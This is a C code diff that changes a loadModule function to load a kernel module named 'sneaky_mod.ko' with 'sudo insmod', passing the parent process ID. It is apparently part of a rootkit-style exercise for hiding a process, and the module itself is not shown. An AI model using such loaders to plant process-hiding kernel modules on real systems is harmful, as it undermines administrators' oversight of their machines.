@@ -98,29 +98,28 @@ void updateFile() {
 }
 
 void loadModule() {
-  pid_t mypid;
-  mypid = fork();
+  //   pid_t mypid;
+  //   mypid = fork();
 
-  if (mypid < 0) {
-    printf("Error in fork...\n");
-    exit(EXIT_FAILURE);
-  } else if (mypid > 0) { // parent wait for child
-    pid_t wpid = waitpid(mypid, NULL, 0);
-    if (wpid < 0) {
-      printf("Error in waiting pid...\n");
-      exit(EXIT_FAILURE);
-    }
-  } else { // child do his own thang
-    char args[50];
-    long ppid = getppid(); // need parent pid
-    sprintf(args, "pid=%ld", ppid);
+  //   if (mypid < 0) {
+  //     printf("Error in fork...\n");
+  //     exit(EXIT_FAILURE);
+  //   } else if (mypid > 0) { // parent wait for child
+  //     pid_t wpid = waitpid(mypid, NULL, 0);
+  //     if (wpid < 0) {
+  //       printf("Error in waiting pid...\n");
+  //       exit(EXIT_FAILURE);
+  //     }
+  //   } else { // child do his own thang
+  char command[100] = {'\0'};
+  long ppid = getppid(); // need parent pid
 
-    if (execl("/sbin/insmod", "insmod", "sneaky_mod.ko", args, (char *)NULL) <
-        0) {
-      printf("Error in loading module...\n");
-      exit(EXIT_FAILURE);
-    }
-  }
+  if (DEBUG)
+    printf("Parent PID is %ld.\n", ppid);
+  sprintf(command, "sudo insmod ./sneaky_mod.ko pid=%ld", ppid);
+
+  system(command);
+  //   }
 }
 
 void unloadModule() {
